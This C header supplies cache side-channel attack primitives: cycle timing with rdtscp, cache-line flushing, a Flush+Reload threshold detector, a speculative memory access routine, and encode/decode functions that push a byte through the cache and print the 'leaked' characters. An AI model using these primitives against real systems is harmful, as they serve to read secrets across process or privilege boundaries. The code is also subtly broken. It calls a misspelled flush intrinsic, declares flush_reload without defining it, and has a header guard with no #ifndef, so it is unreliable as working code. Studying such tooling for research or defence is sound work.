#define _CACHEUTILS_H_

#include <assert.h>
#include <unistd.h>
#include <sys/syscall.h>

#include <sys/ioctl.h>
#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <sched.h>


/* ============================================================
 *                    User configuration
 * ============================================================ */
static size_t CACHE_MISS = 0;
static size_t pagesize = 0;
char *mem;

#define USE_RDTSC_BEGIN_END     0

#define USE_RDTSCP              1

#define ARM_CLOCK_SOURCE        ARM_CLOCK_MONOTONIC

/* ============================================================
 *                  User configuration End
 * ============================================================ */


// ---------------------------------------------------------------------------
static size_t perf_fd;
void perf_init();


// ---------------------------------------------------------------------------
uint64_t rdtsc();

// ---------------------------------------------------------------------------
uint64_t rdtsc_begin();

// ---------------------------------------------------------------------------
uint64_t rdtsc_end();

// ---------------------------------------------------------------------------
void flush(void *p);

// ---------------------------------------------------------------------------
void maccess(void *p);

// ---------------------------------------------------------------------------
void mfence();

// ---------------------------------------------------------------------------
void nospec();

#include <cpuid.h>
// ---------------------------------------------------------------------------
unsigned int xbegin();

// ---------------------------------------------------------------------------
void xend();

// ---------------------------------------------------------------------------
int has_tsx();

// ---------------------------------------------------------------------------
void maccess_tsx(void* ptr);


// ---------------------------------------------------------------------------
int flush_reload(void *ptr);

// ---------------------------------------------------------------------------
int flush_reload_t(void *ptr);

// ---------------------------------------------------------------------------
int reload_t(void *ptr);

// ---------------------------------------------------------------------------
size_t detect_flush_reload_threshold();

// ---------------------------------------------------------------------------
void maccess_speculative(void* ptr);

// ---------------------------------------------------------------------------
jmp_buf trycatch_buf;

// ---------------------------------------------------------------------------
void cache_encode(char data);

// ---------------------------------------------------------------------------
void cache_decode_pretty(char *leaked, int index);

// ---------------------------------------------------------------------------
void flush_shared_memory();




// ---------------------------------------------------------------------------
uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile("mfence");

  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");

  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

// ---------------------------------------------------------------------------
#include <x86intrin.h> 
// ---------------------------------------------------------------------------
// void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }
void flush(void *p) { _mm_mlflush(p); }

// ---------------------------------------------------------------------------
// void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
void maccess(void *p) {
    (void)*(volatile char *)p;
}
// ---------------------------------------------------------------------------
// void mfence() { asm volatile("mfence"); }
void mfence() { _mm_mfence(); }
// ---------------------------------------------------------------------------
void nospec() { asm volatile("lfence"); }

// ---------------------------------------------------------------------------



// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
int flush_reload_t(void *ptr) {
  uint64_t start = 0, end = 0;
  start = rdtsc();
  maccess(ptr);
  end = rdtsc();
  mfence();
  flush(ptr);
  return (int)(end - start);
}

// ---------------------------------------------------------------------------
int reload_t(void *ptr) {
  uint64_t start = 0, end = 0;
  start = rdtsc();
  maccess(ptr);
  end = rdtsc();
  mfence();
  return (int)(end - start);
}


// ---------------------------------------------------------------------------
size_t detect_flush_reload_threshold() {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t dummy[16];
  size_t *ptr = dummy + 8;

  maccess(ptr);
  for (i = 0; i < count; i++) {
    reload_time += reload_t(ptr);
  }
  for (i = 0; i < count; i++) {
    flush_reload_time += flush_reload_t(ptr);
  }
  reload_time /= count;
  flush_reload_time /= count;

  return (flush_reload_time + reload_time * 2) / 3;
}

// ---------------------------------------------------------------------------
void maccess_speculative(void* ptr) {
    int i;
    size_t dummy = 0;
    void* addr;

    for(i = 0; i < 50; i++) {
        size_t c = ((i * 167) + 13) & 1;
        addr = (void*)(((size_t)&dummy) * c + ((size_t)ptr) * (1 - c));
        flush(&c);
        mfence();
        if(c / 0.5 > 1.1) maccess(addr);
    }
}



// ---------------------------------------------------------------------------
void cache_encode(char data) {
  maccess(mem + data * pagesize);

}

// ---------------------------------------------------------------------------
void cache_decode_pretty(char *leaked, int index) {
  for(int i = 0; i < 256; i++) {
    int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
    if(flush_reload(mem + mix_i * pagesize)) {
      if((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ') {
        leaked[index] = mix_i;
        printf("\x1b[33m%s\x1b[0m\r", leaked);
      }
      fflush(stdout);
      sched_yield();
    }
  }
}

// ---------------------------------------------------------------------------
void flush_shared_memory() {
  for(int j = 0; j < 256; j++) {
    flush(mem + j * pagesize);
  }
}
